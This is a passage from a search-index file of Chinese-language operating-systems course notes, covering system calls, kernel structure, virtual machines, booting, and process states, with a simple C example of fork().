\u7b49\u65b9\u5f0f\u5b9e\u73b0</li> </ul> </li> <li>Error Detection: OS \u9700\u8981\u65f6\u523b\u6ce8\u610f\u6f5c\u5728\u7684\u9519\u8bef<ul> <li>\u5bf9\u4e8e\u6bcf\u4e00\u79cd\u9519\u8bef\uff0cOS \u90fd\u9700\u8981\u91c7\u53d6\u5408\u9002\u7684\u5bf9\u7b56\u4fdd\u8bc1\u6b63\u786e\u6027\u4e0e\u8ba1\u7b97\u7684\u8fde\u8d2f\u6027</li> </ul> </li> </ul> <p>\u800c\u4ece System \u7684\u89d2\u5ea6\u6765\u770b\uff0cOS \u63d0\u4f9b\u4e86\u4ee5\u4e0b\u670d\u52a1\uff1a</p> <ul> <li>Resource Allocation: \u8d44\u6e90\u9700\u8981\u5728\u591a\u7528\u6237\u3001\u591a\u8fdb\u7a0b\u4e4b\u95f4\u5206\u914d</li> <li>Accounting: \u8ddf\u8e2a\u54ea\u4e2a\u7528\u6237\u4f7f\u7528\u591a\u5c11\u8d44\u6e90\u548c\u54ea\u79cd\u8d44\u6e90</li> <li>Protection and Security: <ul> <li>Protection \u5305\u62ec\u786e\u4fdd\u6240\u6709\u7cfb\u7edf\u8d44\u6e90\u7684\u8bbf\u95ee\u90fd\u662f\u53d7\u63a7\u7684</li> <li>Security \u5305\u62ec\u5bf9\u5916\u6765\u8005\u8fdb\u884c\u7528\u6237\u8ba4\u8bc1\u3001\u5bf9\u5916\u90e8 I/O \u8bbe\u5907\u8fdb\u884c\u68c0\u67e5</li> </ul> </li> </ul>"},{"location":"Courses/OS/Topic2/#system-calls","title":"System Calls","text":"<p>System Calls \u662f OS \u63d0\u4f9b\u7684\u7f16\u7a0b\u63a5\u53e3\u670d\u52a1\uff0c\u5927\u90e8\u5206\u7528\u6237\u90fd\u901a\u8fc7\u6253\u5305\u540e\u7684\u9ad8\u5c42 Application Program Interface\uff08API\uff09 \u6765\u95f4\u63a5\u8c03\u7528\u3002</p> <p>\u5b9e\u73b0\u4e0a\uff0cCPU \u7684\u8fd0\u884c\u6a21\u5f0f\u88ab\u5206\u4e3a\u7528\u6237\u6001\uff08User Mode\uff09\u548c\u5185\u6838\u6001\uff08Kernel Mode\uff09\u3002\u5f53 CPU \u5904\u4e8e\u7528\u6237\u6001\u65f6\uff0cCPU \u53ea\u80fd\u6267\u884c\u975e\u7279\u6743\u6307\u4ee4\u3002\u901a\u5e38\uff0c\u6211\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\u8fd0\u884c\u5728\u7528\u6237\u6001\uff0c\u800c\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u8fd0\u884c\u5728\u5185\u6838\u6001\u3002</p> <p>\u867d\u7136\u6211\u4eec\u53ef\u4ee5\u5728\u7528\u6237\u6001\u8c03\u7528\u76f8\u5173\u7684 Syscall \u6307\u4ee4\uff0c\u4f46\u662f\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u65f6\u4f1a\u53d1\u751f\u7279\u6743\u7ea7\u7684\u5207\u6362\uff0c\u56e0\u6b64\u5b83\u5c5e\u4e8e\u7279\u6743\u76f8\u5173\u6307\u4ee4\uff08privilege-sensitive\uff09\u3002</p> <p>\u4e09\u4e2a\u6700\u666e\u904d\u7684 API</p> <ul> <li>Win32 API for Windows</li> <li>POSIX API for POSIX-based Systems<ul> <li>\u51e0\u4e4e\u6240\u6709\u7684 UNIX, \u4ee5\u53ca Linux \u548c MacOS</li> </ul> </li> <li>Java API for JVM</li> </ul> <p>\u6309\u7167\u529f\u80fd\uff0cSystem Calls \u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u51e0\u7c7b\uff1a</p> <ul> <li>Process Control</li> <li>File Management</li> <li>Device Management</li> <li>Information Maintenance (e.g. time, date)</li> <li>Communications</li> <li>Protection</li> </ul> <p>\u4e00\u4e9b\u4e3e\u4f8b</p> <p></p> <p>\u6bcf\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\u90fd\u6709\u552f\u4e00\u7f16\u53f7\uff0c\u5f53\u7528\u6237\u7a0b\u5e8f\u53d1\u8d77\u7cfb\u7edf\u8c03\u7528\u65f6\uff0c\u901a\u8fc7\u4e00\u4e2a table \u67e5\u627e\u5230\u5bf9\u5e94\u7684\u5185\u6838\u670d\u52a1\u3002</p> <p>\u56e0\u6b64\u5bf9\u4e8e\u8c03\u7528\u8005\u6765\u8bf4\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ea\u9700\u8981\u6309\u7167 API \u7684\u89c4\u8303\u8c03\u7528\u51fd\u6570\uff0c\u800c\u4e0d\u5fc5\u77e5\u9053\u7cfb\u7edf\u8c03\u7528\u5728\u5185\u6838\u91cc\u7684\u5177\u4f53\u5b9e\u73b0\u3002</p> \u4f8b\u5982 <code>printf()</code> API \u4e2d\u5c31\u5305\u542b\u4e86 <code>write()</code> \u8fd9\u4e00\u7cfb\u7edf\u8c03\u7528 <p></p> <p>\u5f88\u591a\u7cfb\u7edf\u8c03\u7528\u8fd8\u9700\u8981\u4e00\u4e9b\u53c2\u6570\uff0c\u901a\u5e38\u6709\u4e09\u79cd\u4f20\u9012\u65b9\u6cd5\uff1a</p> <ul> <li>&lt;1&gt; Pass the parameters in registers<ul> <li>\u4f46\u662f\u6709\u65f6\u5019\u9700\u8981\u7684\u53c2\u6570\u5927\u4e8e\u53ef\u7528\u7684\u5bc4\u5b58\u5668\u6570\u91cf</li> </ul> </li> <li>&lt;2&gt; Parameters stored in a block(or table) in memory, and address of block passed as a paramter in register<ul> <li>\u8fd9\u4e5f\u662f Linux \u548c Solaris \u4f7f\u7528\u7684\u65b9\u6cd5</li> </ul> </li> <li>&lt;3&gt; Parameters pushed onto the stack by user program and popped off by the OS</li> </ul> <p>System Programs \u672c\u8eab\u5e76\u4e0d\u662f kernel \u7684\u4e00\u90e8\u5206\uff0c\u4f46\u662f\u5b83\u4eec\u4f9d\u8d56\u7cfb\u7edf\u8c03\u7528\u6765\u5b8c\u6210\u4efb\u52a1\uff0c\u8fd9\u4e9b\u7a0b\u5e8f\u4e3a\u7528\u6237\u63d0\u4f9b\u4e86\u4e00\u4e2a\u66f4\u65b9\u4fbf\u7684\u5de5\u4f5c\u73af\u5883\uff0c\u5b83\u4eec\u7b80\u5316\u4e86\u7f16\u7a0b\u3001\u8fd0\u884c\u3001\u6587\u4ef6\u7ba1\u7406\u7b49\u64cd\u4f5c\u3002\u7cfb\u7edf\u7a0b\u5e8f\u53ef\u5206\u7c7b\u4e3a\uff1a</p> <ul> <li>File Manipulation \u6587\u4ef6\u64cd\u4f5c<ul> <li>\u5bf9 files \u548c directories \u8fdb\u884c Create, Delete, Copy, Rename, Print, Dump, List \u7b49\u64cd\u4f5c</li> <li><code>cp</code>, <code>rm</code>, <code>dir</code>, <code>ls</code>...</li> </ul> </li> <li>Status Information \u72b6\u6001\u4fe1\u606f<ul> <li>\u663e\u5f0f\u7cfb\u7edf\u8fd0\u884c\u72b6\u6001\u3001\u8d44\u6e90\u4f7f\u7528\u60c5\u51b5</li> <li><code>top</code>, <code>ps</code>, <code>df</code>...</li> </ul> </li> <li>File Modification \u6587\u4ef6\u4fee\u6539<ul> <li>\u6587\u672c\u7f16\u8f91\u5668</li> <li><code>vim</code>, <code>nano</code>...</li> </ul> </li> <li>Programming Language Support \u7f16\u7a0b\u8bed\u8a00\u652f\u6301<ul> <li>Compilers, Assemblers, Debuggers, Interpreters</li> <li><code>gcc</code>, <code>python</code>, <code>gdb</code>...</li> </ul> </li> <li>Program Loading &amp; Execution \u7a0b\u5e8f\u52a0\u8f7d\u4e0e\u6267\u884c<ul> <li>Loaders</li> <li><code>ld</code>, <code>exec</code>...</li> </ul> </li> <li>Communications \u901a\u4fe1<ul> <li>\u4e3a\u8fdb\u7a0b\u4e4b\u95f4\u3001\u7528\u6237\u4e4b\u95f4\u3001\u4e0d\u540c\u7cfb\u7edf\u4e4b\u95f4\u5efa\u7acb virtual connections</li> <li><code>ssh</code>, <code>ftp</code>...</li> </ul> </li> </ul>"},{"location":"Courses/OS/Topic2/#os-structure","title":"OS Structure","text":"<p>\u968f\u7740\u64cd\u4f5c\u7cfb\u7edf\u529f\u80fd\u7684\u4e0d\u65ad\u589e\u591a\u548c\u4ee3\u7801\u89c4\u6a21\u7684\u4e0d\u65ad\u6269\u5927\uff0c\u63d0\u4f9b\u5408\u7406\u7684\u7ed3\u6784\uff0c\u5bf9\u964d\u4f4e\u64cd\u4f5c\u7cfb\u7edf\u590d\u6742\u5ea6\u3001\u63d0\u5347\u64cd\u4f5c\u7cfb\u7edf\u5b89\u5168\u4e0e\u53ef\u9760\u6027\u6765\u8bf4\u53d8\u5f97\u5c24\u4e3a\u91cd\u8981\u3002</p> <p>\u5206\u5c42\u6cd5</p> <p>\u5206\u5c42\u6cd5\u5c06\u64cd\u4f5c\u7cfb\u7edf\u88ab\u5212\u5206\u4e3a\u591a\u4e2a\u5c42\u6b21\uff0c\u6bcf\u4e2a\u5c42\u6b21\u90fd\u53ea\u80fd\u4f7f\u7528\u5b83\u7684\u4e0b\u4e00\u5c42\u63d0\u4f9b\u7684 functions \u548c services\uff0c\u8fd9\u662f\u4e00\u4e2a\u5355\u5411\u4f9d\u8d56\u3002</p> <p>\u6700\u5e95\u5c42\uff08layer 0\uff09\u4e3a\u786c\u4ef6\uff0c\u6700\u9ad8\u5c42\uff08layer N\uff09\u4e3a User Interface</p> <p>\u6700\u539f\u59cb\u7684 UNIX OS \u53ea\u5305\u542b System Programs \u548c Kernel \u4e24\u4e2a\u90e8\u5206\uff0c\u5c5e\u4e8e Monolithic Structure\uff1a</p> <p></p> <p>\u5206\u5c42\u6cd5\u7b80\u5316\u4e86\u7cfb\u7edf\u7684\u8bbe\u8ba1\u4e0e\u8c03\u8bd5\uff0c\u6613\u4e8e\u6269\u5145\u7ef4\u62a4\uff0c\u4f46\u662f\u4f1a\u5bfc\u81f4\u4f9d\u8d56\u5173\u7cfb\u56fa\u5b9a\u540e\u663e\u5f97\u4e0d\u7075\u6d3b\uff0c\u5e76\u4e14\u6267\u884c\u6bcf\u4e2a\u529f\u80fd\u90fd\u9700\u8981\u81ea\u4e0a\u800c\u4e0b\u7a7f\u8d8a\u591a\u5c42\uff0c\u6548\u7387\u8f83\u5dee\u3002</p> <p>Microkernel</p> <p>\u6309\u7167\u64cd\u4f5c\u7cfb\u7edf\u7684\u5185\u6838\u67b6\u6784\u6765\u5212\u5206\uff0c\u53ef\u4ee5\u5206\u4e3a\u5b8f\u5185\u6838\u548c\u5fae\u5185\u6838\u4e24\u79cd\u3002</p> <p>Microkernel \u7684\u601d\u60f3\u5e0c\u671b\u628a\u672c\u6765\u653e\u5728\u5185\u6838\u91cc\u7684\u529f\u80fd\u5c3d\u91cf\u79fb\u52a8\u5230\u7528\u6237\u6001\uff08User Space\uff09\u4e2d\u8fd0\u884c\uff0c\u4e0d\u540c\u6a21\u5757\u4e4b\u95f4\u901a\u8fc7 Message Passing \u8fdb\u884c\u4ea4\u6d41\u3002\u8fd9\u4e00\u601d\u60f3\u7684\u4f18\u70b9\u5305\u62ec\uff1a</p> <ul> <li>\u53ef\u6269\u5c55\u6027 (Easier to extend)\uff1a\u65b0\u529f\u80fd\u53ef\u4ee5\u4f5c\u4e3a\u7528\u6237\u6001\u670d\u52a1\u52a0\u8fdb\u6765\uff0c\u4e0d\u5fc5\u6539\u5185\u6838\u3002</li> <li>\u53ef\u79fb\u690d\u6027 (Easier to port)\uff1a\u53ea\u8981\u628a\u5c0f\u5c0f\u7684\u5fae\u5185\u6838\u79fb\u690d\u5230\u65b0\u786c\u4ef6\uff0c\u5176\u4f59\u7528\u6237\u6001\u670d\u52a1\u51e0\u4e4e\u4e0d\u7528\u5927\u6539\u3002</li> <li>\u53ef\u9760\u6027 (More reliable)\uff1a\u51fa bug \u7684\u4ee3\u7801\u5927\u90e8\u5206\u8dd1\u5728\u7528\u6237\u6001\uff0c\u5d29\u6e83\u4e0d\u4f1a\u5bfc\u81f4\u6574\u4e2a\u7cfb\u7edf\u5d29\u6e83\uff0c\u53ea\u9700\u8981\u91cd\u542f\u5bf9\u5e94\u6a21\u5757\u5373\u53ef\u3002</li> <li>\u5b89\u5168\u6027 (More secure)\uff1a\u5185\u6838\u6001\u4ee3\u7801\u5c11\uff0c\u653b\u51fb\u9762\u66f4\u5c0f\u3002</li> </ul> <p>\u5fae\u5185\u6838\u9700\u8981\u9891\u7e41\u5730\u5728\u7528\u6237\u6001\u548c\u5185\u6838\u6001\u8fdb\u884c\u5207\u6362\uff0c\u64cd\u4f5c\u7cfb\u7edf\u7684\u6267\u884c\u5f00\u9500\u8f83\u5927\uff0c\u4ece\u800c\u5bfc\u81f4\u4e86\u660e\u663e\u7684\u6027\u80fd\u95ee\u9898\u3002</p> <p>\u4e00\u4e2a\u7ecf\u5178\u7684\u5fae\u5185\u6838\u67b6\u6784\u5982\u4e0b\uff1a</p> <p></p> MacOS \u5c5e\u4e8e\u6df7\u5408\u578b\u67b6\u6784 <p></p> <p>\u76ee\u524d\u7684\u4e3b\u6d41\u64cd\u4f5c\u7cfb\u7edf\u867d\u7136\u90fd\u662f\u5b8f\u5185\u6838\u67b6\u6784\uff0c\u4f46\u4e5f\u5438\u6536\u5f88\u591a\u5fae\u5185\u6838\u67b6\u6784\u7684\u4f18\u70b9</p> <p>\u6a21\u5757\u5316</p> <p>\u5927\u591a\u6570\u73b0\u4ee3 OS \u90fd\u91c7\u7528\u4e86\u5185\u6838\u6a21\u5757\u5316\u8bbe\u8ba1\uff08Kernel Modules\uff09\uff0c\u5b83\u91c7\u7528\u9762\u5411\u5bf9\u8c61\u8bbe\u8ba1\uff0c\u5c06\u5404\u4e2a\u6838\u5fc3\u529f\u80fd\u90fd\u505a\u6210\u72ec\u7acb\u6a21\u5757\u3002\u4e0d\u540c\u6a21\u5757\u4e4b\u95f4\u4e0d\u4f7f\u7528 Message Passing\uff0c\u800c\u662f\u76f4\u63a5\u8c03\u7528\u5f7c\u6b64\u7684\u63a5\u53e3\u51fd\u6570\uff0c\u56e0\u6b64\u6548\u7387\u66f4\u9ad8\u3002</p> <p>\u4f8b\u5982\uff0cSolaris \u7684 Modular Approach \u8bbe\u8ba1\u5982\u4e0b\uff1a</p> <p></p>"},{"location":"Courses/OS/Topic2/#virtual-machines","title":"Virtual Machines","text":"<p>\u865a\u62df\u673a\u5c06\u786c\u4ef6+\u5185\u6838\u6574\u4f53\u770b\u4f5c\u201c\u786c\u4ef6\u5c42\u201d\uff0c\u5728\u5b83\u4e0a\u9762\u518d\u505a\u4e86\u4e00\u5c42\u62bd\u8c61\u3002VM \u5bf9\u8fd0\u884c\u5728\u4e4b\u4e0a\u7684\u8f6f\u4ef6\u63d0\u4f9b\u548c\u771f\u5b9e\u7269\u7406\u786c\u4ef6\u4e00\u6837\u7684\u63a5\u53e3\uff0c\u4ece\u800c\u8ba9\u64cd\u4f5c\u7cfb\u7edf\u6216\u5e94\u7528\u611f\u89c9\u81ea\u5df1\u76f4\u63a5\u8dd1\u5728\u771f\u5b9e\u673a\u5668\u4e0a\u3002</p> <p></p>"},{"location":"Courses/OS/Topic2/#system-boot","title":"System Boot","text":"<p>\u6bcf\u53f0\u5177\u4f53\u673a\u5668\u7684\u786c\u4ef6\u73af\u5883\u5e76\u4e0d\u76f8\u540c\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f7f\u7528\u7a0b\u5e8f <code>SYSGEN</code> \u6536\u96c6\u786c\u4ef6\u914d\u7f6e\u4fe1\u606f\uff0c\u4ece\u800c\u9488\u5bf9\u8be5\u673a\u5668\u751f\u6210\u9002\u914d\u7248\u672c\u3002</p> <p>\u8ba1\u7b97\u673a\u542f\u52a8\u65f6\uff0c\u9700\u8981\u628a Kernel \u88c5\u8fdb\u5185\u5b58\u4e2d\u5e76\u5f00\u59cb\u6267\u884c\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u79f0\u4e3a Booting\u3002Bootstrap Program \u662f\u5b58\u4e8e ROM \u91cc\u7684\u4e00\u5c0f\u6bb5\u4ee3\u7801\uff0c\u5b83\u8d1f\u8d23\u5b9a\u4f4d\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\uff0c\u628a\u5b83\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\uff0c\u5e76\u542f\u52a8\u8fd0\u884c\u3002</p>"},{"location":"Courses/OS/Topic3/","title":"Processes","text":""},{"location":"Courses/OS/Topic3/#processes","title":"Processes","text":"<p> \u7ea6 11036 \u4e2a\u5b57  283 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 59 \u5206\u949f</p>"},{"location":"Courses/OS/Topic3/#concept","title":"Concept","text":"<p>\u5728 Batch System \u4e2d\uff0c\u6211\u4eec\u79f0\u8fd0\u884c\u7684\u7a0b\u5e8f\u4e3a job\uff1b\u5728 Time-Sharing System \u4e2d\uff0c\u6211\u4eec\u79f0\u8fd0\u884c\u7684\u7a0b\u5e8f\u4e3a task\u3002\u5728\u6559\u79d1\u4e66\u4e2d\uff0c\u4e0a\u9762\u7684\u4e24\u4e2a\u6982\u5ff5\u51e0\u4e4e\u4e0e\u8fdb\u7a0b\uff08Process\uff09\u7b49\u4ef7\u3002</p> <p>\u8fdb\u7a0b\u662f\u4e00\u6bb5 Program \u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u6267\u884c\u5b9e\u4f53\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u6709\u81ea\u5df1\u72ec\u7279\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u5305\u62ec\u7528\u6237\u90e8\u5206\u548c\u5185\u6838\u90e8\u5206\u3002</p> <p>\u5bf9\u4e8e\u7528\u6237\u90e8\u5206\uff0ctext \u548c data \u90e8\u5206\u6240\u9700\u8981\u7684\u7a7a\u95f4\u5728\u4e00\u5f00\u59cb\u5c31\u88ab\u786e\u5b9a\uff0c\u800c heap \u548c stack \u90fd\u53ef\u4ee5\u52a8\u6001\u7684\u6269\u5c55\u548c\u6536\u7f29\uff1a</p> <ul> <li>Text section: \u4ee3\u7801\u533a</li> <li>Data section: \u6570\u636e\u533a</li> <li>Heap: \u5806</li> <li>Stack: \u6808</li> </ul> <p>\u6211\u4eec\u4f7f\u7528 Process Control Block(PCB) \u6765\u4fdd\u5b58\u4e00\u4e2a\u8fdb\u7a0b\u7684\u5185\u6838\u90e8\u5206\uff0c\u8fd9\u4e9b\u63a7\u5236\u4fe1\u606f\u5305\u62ec\uff1a</p> <ul> <li>Process State: \u8fdb\u7a0b\u72b6\u6001</li> <li>Program Counter: \u7a0b\u5e8f\u8ba1\u6570\u5668</li> <li>CPU Registers: \u5bc4\u5b58\u5668\u4fe1\u606f</li> <li>CPU Scheduling Information: \u8c03\u5ea6\u4fe1\u606f</li> <li>Memory-management Information: \u5185\u5b58\u7ba1\u7406\u4fe1\u606f</li> <li>Accounting Information: \u52a8\u6001\u6570\u636e\u7684\u7edf\u8ba1\u4e0e\u8bb0\u5f55\u4fe1\u606f</li> <li>I/O Status Information: I/O \u72b6\u6001\u4fe1\u606f</li> </ul> <p>\u5f53 CPU \u9700\u8981\u5728\u4e0d\u540c\u8fdb\u7a0b\u4e4b\u95f4\u5207\u6362\u65f6\uff0c\u5b83\u9700\u8981\u4fdd\u5b58\u4e0a\u4e00\u4e2a\u8fdb\u7a0b\u7684 PCB\uff0c\u5e76\u52a0\u8f7d\u4e0b\u4e00\u4e2a\u8fdb\u7a0b\u7684 PCB \u4fe1\u606f\uff1a</p> <p></p> <p>\u4e24\u4e2a\u8fdb\u7a0b\u4e4b\u95f4\u7684\u5207\u6362\u5ef6\u8fdf\u79f0\u4f5c Dispatch Latency\uff1a</p> <p></p> <p>\u7cfb\u7edf\u603b\u662f\u901a\u8fc7 PCB \u5bf9\u8fdb\u7a0b\u8fdb\u884c\u63a7\u5236</p> <p>\u8fdb\u7a0b\u5728\u5176\u751f\u547d\u5468\u671f\u5185\uff0c\u7531\u4e8e\u7cfb\u7edf\u4e2d\u5404\u4e2a\u8fdb\u7a0b\u7684\u76f8\u4e92\u5236\u7ea6\u4ee5\u53ca\u7cfb\u7edf\u8fd0\u884c\u73af\u5883\u7684\u53d8\u5316\uff0c\u8fdb\u7a0b\u7684\u72b6\u6001\u4e5f\u5728\u4e0d\u65ad\u53d1\u751f\u53d8\u5316\u3002\u4e00\u4e2a\u8fdb\u7a0b\u901a\u5e38\u6709\u4ee5\u4e0b\u4e94\u79cd\u72b6\u6001\uff1a</p> <p></p> <ul> <li>new: \u8fdb\u7a0b\u6b63\u5728\u88ab\u521b\u9020<ul> <li>\u521b\u5efa\u8fc7\u7a0b\u4f1a\u5206\u914d\u521d\u59cb\u8d44\u6e90\uff0c\u5305\u62ec PCB \u7b49</li> </ul> </li> <li>running: \u6307\u4ee4\u6b63\u5728\u88ab\u6267\u884c<ul> <li>\u5373\u6b63\u5728\u4f7f\u7528 CPU \u8d44\u6e90</li> <li>CPU \u6709\u51e0\u4e2a core\uff0c\u5c31\u6700\u591a\u6709\u51e0\u4e2a\u8fdb\u7a0b\u5904\u4e8e running \u72b6\u6001</li> </ul> </li> <li>waiting: \u8fdb\u7a0b\u6b63\u5728\u7b49\u5f85\u67d0\u4e9b\u4e8b\u4ef6\uff0c\u6216\u6b63\u56e0\u4e3a\u67d0\u4e9b\u4e8b\u4ef6\u88ab\u963b\u585e<ul> <li>waiting \u72b6\u6001\u4e0b\uff0c\u5373\u4fbf\u6709\u7a7a\u4f59 CPU \u8d44\u6e90\uff0c\u8be5\u8fdb\u7a0b\u4e5f\u4e0d\u4f1a\u7ee7\u7eed</li> </ul> </li> <li>ready: \u8fdb\u7a0b\u6b63\u5728\u7b49\u5f85\u88ab\u5206\u914d\u7ed9\u5904\u7406\u5668<ul> <li>\u4e00\u65e6\u6709\u7a7a\u4f59 CPU \u8d44\u6e90\uff0c\u5c31\u4f1a\u8fdb\u5165 running \u72b6\u6001</li> </ul> </li> <li>terminated: \u8fdb\u7a0b\u7ed3\u675f\u6267\u884c</li> </ul> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u4ece running \u53d8\u4e3a waiting \u662f\u4e3b\u52a8\u7684\u884c\u4e3a\uff1b\u4ece waiting \u53d8\u4e3a ready \u662f\u88ab\u52a8\u7684\u884c\u4e3a\uff0c\u9700\u8981\u5176\u5b83\u76f8\u5173\u8fdb\u7a0b\u7684\u534f\u52a9\u3002</p>"},{"location":"Courses/OS/Topic3/#operations-on-processes","title":"Operations on Processes","text":""},{"location":"Courses/OS/Topic3/#process-creation","title":"Process Creation","text":"<p>\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u521b\u5efa\u4e86\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u65f6\uff1a</p> <ul> <li>\u521b\u5efa\u8005\u53eb \u7236\u8fdb\u7a0b (parent process)</li> <li>\u88ab\u521b\u5efa\u7684\u53eb \u5b50\u8fdb\u7a0b (child process)</li> </ul> <p>\u5b50\u8fdb\u7a0b\u672c\u8eab\u4e5f\u53ef\u4ee5\u518d\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\uff0c\u4e8e\u662f\u6574\u4e2a\u7cfb\u7edf\u91cc\u7684\u8fdb\u7a0b\u5c31\u5f62\u6210\u4e86\u4e00\u4e2a \u6811\u72b6\u7ed3\u6784\uff08process tree\uff09\uff0c\u4f8b\u5982\uff1a</p> <p></p> <p>\u6211\u4eec\u4f7f\u7528 <code>pid</code> \u6765\u6807\u8bc6\u8fdb\u7a0b\uff0c\u4f7f\u7528 <code>ppid</code> \u6765\u6807\u8bc6\u5b83\u7684\u7236\u8fdb\u7a0b\u3002</p> <p>\u4f7f\u7528\u547d\u4ee4 <code>pstree</code> \u53ef\u4ee5\u67e5\u770b\u8fdb\u7a0b\u6811</p> <p>\u5f53\u7236\u8fdb\u7a0b\u521b\u5efa\u5b50\u8fdb\u7a0b\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u9700\u8981\u51b3\u5b9a\u8d44\u6e90\u662f\u5426\u5171\u4eab\uff0c\u5e38\u89c1\u6709\u4e09\u79cd\u7b56\u7565\uff1a</p> \u6a21\u5f0f \u8bf4\u660e \u2460 \u7236\u4e0e\u5b50\u5171\u4eab\u6240\u6709\u8d44\u6e90 \u6bd4\u5982\u6253\u5f00\u7684\u6587\u4ef6\u3001\u5185\u5b58\u7a7a\u95f4\u7b49\u90fd\u5171\u4eab\u3002 \u2461 \u5b50\u53ea\u5171\u4eab\u7236\u8fdb\u7a0b\u8d44\u6e90\u7684\u5b50\u96c6 \u4f8b\u5982\uff0c\u53ea\u7ee7\u627f\u6253\u5f00\u7684\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u3002 \u2462 \u7236\u4e0e\u5b50\u5b8c\u5168\u4e0d\u5171\u4eab\u8d44\u6e90 \u5b50\u8fdb\u7a0b\u6709\u81ea\u5df1\u7684\u72ec\u7acb\u8d44\u6e90\uff0c\u5e38\u7528\u4e8e\u9694\u79bb\u3002 <p>\u4e0d\u540c\u7cfb\u7edf\u6216\u521b\u5efa\u65b9\u5f0f\uff08\u5982 Linux \u7684 <code>fork()</code> \u6216 <code>exec()</code>\uff09\u4f1a\u91c7\u7528\u4e0d\u540c\u7b56\u7565\u3002</p> <p>\u4f8b\u5982\u8fdb\u7a0b\u7ba1\u7406 API <code>fork()</code> \u4f1a\u5b8c\u6574\u590d\u5236\u4e00\u4efd\u72b6\u6001\u673a\uff0c\u5305\u62ec\u5185\u5b58\u3001\u5bc4\u5b58\u5668\u7b49\u3002\u5728\u6267\u884c <code>fork()</code> \u65f6\uff0c\u7236\u8fdb\u7a0b\u4e2d\u4f1a\u8fd4\u56de\u5b50\u8fdb\u7a0b\u7684 <code>pid</code>\uff0c\u5b50\u8fdb\u7a0b\u4e2d\u5219\u8fd4\u56de 0\u3002</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;sys/types.h&gt;\n\nint main() {\n    printf(\"A process starts!\\n\");\n\n    pid_t pid;\n    pid = fork();\n\n    if (pid &lt; 0) {\n        printf(\"Fork failed!\\n\");\n    } else if (pid == 0) {\n        // sleep(1);\n        printf(\"pid is zero, so it's child process!\\n\");\n    } else {\n        // wait(NULL);\n        // sleep(1);\n        printf(\"pid is nonzero thus it's parent process!\\n\");\n    }\n}\n</code></pre> <p>\u4e0a\u9762\u7684 C \u4ee3\u7801\u4e2d\uff0c\u7236\u8fdb\u7a0b\u5728 <code>fork()</code> \u521b\u5efa\u5b50\u8fdb\u7a0b\u540e\uff0c\u4e24\u4e2a\u8fdb\u7a0b\u5c06\u5e76\u53d1\u6267\u884c\uff08Execute Concurrently\uff09\uff0c\u4e92\u4e0d\u963b\u585e\uff1b\u5982\u679c\u5c06 Line 18 \u7684\u6ce8\u91ca\u53d6\u6d88\uff0c\u90a3\u4e48\u7236\u8fdb\u7a0b\u5c06\u7b49\u5230\u5b50\u8fdb\u7a0b\u8fd4\u56de\u4fe1\u53f7 <code>SIGCHILD</code> \u624d\u4f1a\u7ee7\u7eed\u8fd0\u884c\u3002</p> <p>\u7236\u5b50\u8fdb\u7a0b\u7684\u7ec8\u6b62\u5173\u7cfb</p> <p>\u5982\u679c\u5b50\u8fdb\u7a0b\u7ed3\u675f\u65f6\u7236\u8fdb\u7a0b\u5df2\u7ecf\u7ec8\u6b62\uff0c\u6b64\u65f6\u8be5\u5b50\u8fdb\u7a0b\u88ab\u79f0\u4e3a\u5b64\u513f\u8fdb\u7a0b\uff0c\u90a3\u4e48 UNIX \u7684\u6258\u5b64\u673a\u5236\u4f1a\u5c06\u5b50\u8fdb\u7a0b\u7684 <code>ppid</code> \u8bbe\u7f6e\u4e3a 1\uff0c\u5373 <code>init</code> \u8fdb\u7a0b\uff1b\u4e0d\u8fc7\u6709\u4e9b OS \u4e0d\u5141\u8bb8\u5b50\u8fdb\u7a0b\u5728\u7236\u8fdb\u7a0b\u9000\u51fa\u540e\u4ecd\u7136\u8fd0\u884c\u3002</p> <p>\u6b64\u5916\uff0c\u5982\u679c\u5b50\u8fdb\u7a0b\u5df2\u7ecf\u7ed3\u675f\uff0c\u4f46\u662f\u7236\u8fdb\u7a0b\u6ca1\u6709\u8c03\u7528 <code>wait()</code> \u63a5\u53d7\u5b50\u8fdb\u7a0b\u8fd4\u56de\u7801\uff0c\u5219\u6b64\u65f6\u8be5\u5b50\u8fdb\u7a0b\u88ab\u79f0\u4e3a\u50f5\u5c38\u8fdb\u7a0b\u3002</p> <p>\u800c <code>exec()</code> \u4f1a\u5c06\u5f53\u524d\u8fdb\u7a0b\u91cd\u7f6e\u6210\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u63cf\u8ff0\u72b6\u6001\u673a\u7684\u521d\u59cb\u72b6\u6001\uff0c\u65b0\u7a0b\u5e8f\u5c06\u4f1a\u8986\u76d6\u539f\u6709\u7684\u5185\u5b58\u7a7a\u95f4\u3002</p> <p>\u4e00\u4e2a\u5178\u578b\u7684\u4f7f\u7528\u8be5 API \u7684\u6d41\u7a0b\u5982\u4e0b\uff0c\u5b83\u5148 <code>fork</code> \u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u8ba9\u5b50\u8fdb\u7a0b\u6267\u884c\u522b\u7684\u7a0b\u5e8f\uff0c\u800c\u7236\u8fdb\u7a0b\u53ea\u8981\u7b49\u5f85\u5b50\u8fdb\u7a0b\u7ed3\u675f\u5373\u53ef\uff1a</p> <pre><code>pid_t pid = fork();      // 